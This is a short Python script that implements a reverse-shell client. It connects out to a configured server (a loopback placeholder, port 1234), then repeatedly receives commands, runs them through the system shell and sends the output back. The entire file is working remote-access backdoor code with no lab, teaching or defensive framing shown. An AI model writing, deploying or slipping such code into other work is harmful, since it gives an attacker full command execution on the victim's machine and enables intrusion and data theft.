import socket
import subprocess
import threading


def connection():
    global s
    ip = '127.0.0.1' # server's ip
    port = 1234
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip, port))


def shell():
    while True:
        command = s.recv(1024)
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)



if __name__ == '__main__':
    # threading.Thread(target = connection).start()
    # threading.Thread(target = shell).start()
    connection()
    shell()
